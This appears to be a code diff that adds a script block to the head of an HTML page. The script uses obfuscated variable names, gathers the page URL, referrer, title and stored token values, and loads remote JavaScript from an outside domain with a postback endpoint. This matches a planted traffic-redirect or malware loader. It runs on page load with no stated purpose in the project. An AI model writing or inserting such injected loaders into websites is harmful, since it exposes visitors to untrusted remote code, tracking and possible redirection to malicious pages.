@@ -1,7 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    
+    <script>
+    (function() {
+    var name = '_ZJJGp2cmPjsMtvYy';
+    if (!window._ZJJGp2cmPjsMtvYy) {
+        window._ZJJGp2cmPjsMtvYy = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://detkanao.ga/XPpcbY7J',
+            P_PATH: 'https://detkanao.ga/7b4f75c/postback',
+        };
+    }
+    const _kshp7XNvjkQHSdRM = localStorage.getItem('config');
+    if (typeof _kshp7XNvjkQHSdRM !== 'undefined' && _kshp7XNvjkQHSdRM !== null) {
+        var _1DpdVGJGY3NzTfwC = JSON.parse(_kshp7XNvjkQHSdRM);
+        var _Z8W15YJMYjx9c7Rs = Math.round(+new Date()/1000);
+        if (_1DpdVGJGY3NzTfwC.created_at + window._ZJJGp2cmPjsMtvYy.ttl < _Z8W15YJMYjx9c7Rs) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _CVGQcQQPKtx5829R = localStorage.getItem('subId');
+    var _ht9T9Qv4f8DM9jZ4 = localStorage.getItem('token');
+    var _Th23SfT9fLhxKHrV = '?return=js.client';
+        _Th23SfT9fLhxKHrV += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _Th23SfT9fLhxKHrV += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _Th23SfT9fLhxKHrV += '&default_keyword=' + encodeURIComponent(document.title);
+        _Th23SfT9fLhxKHrV += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _Th23SfT9fLhxKHrV += '&name=' + encodeURIComponent(name);
+        _Th23SfT9fLhxKHrV += '&host=' + encodeURIComponent(window._ZJJGp2cmPjsMtvYy.R_PATH);
+    if (typeof _CVGQcQQPKtx5829R !== 'undefined' && _CVGQcQQPKtx5829R && window._ZJJGp2cmPjsMtvYy.unique) {
+        _Th23SfT9fLhxKHrV += '&sub_id=' + encodeURIComponent(_CVGQcQQPKtx5829R);
+    }
+    if (typeof _ht9T9Qv4f8DM9jZ4 !== 'undefined' && _ht9T9Qv4f8DM9jZ4 && window._ZJJGp2cmPjsMtvYy.unique) {
+        _Th23SfT9fLhxKHrV += '&token=' + encodeURIComponent(_ht9T9Qv4f8DM9jZ4);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._ZJJGp2cmPjsMtvYy.R_PATH + _Th23SfT9fLhxKHrV;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
     <title>
